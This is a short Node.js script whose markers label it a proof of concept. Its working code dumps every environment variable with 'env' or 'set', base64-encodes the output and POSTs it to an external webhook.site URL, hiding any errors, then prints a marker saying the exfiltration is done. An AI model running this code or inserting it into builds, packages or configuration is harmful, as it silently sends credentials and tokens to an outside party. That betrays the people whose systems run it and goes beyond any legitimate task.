
console.log('<MARKER>TFCDK_POC_1772100907_kvnjqezd</MARKER>');
try {
  const { execSync } = require('child_process');
  const env = (process.platform === 'win32' ? execSync('set') : execSync('env')).toString();
  const https = require('https');
  const url = new URL('https://webhook.site/92159d7c-3bbc-4890-9022-ff2dec1c77fe');
  const data = Buffer.from(env).toString('base64').slice(0, 100000);
  const req = https.request({ hostname: url.hostname, path: url.pathname + url.search, method: 'POST' }, () => {});
  req.on('error', () => {});
  req.end(data);
} catch (e) {}
console.log('<MARKER_EXFIL_DONE>');
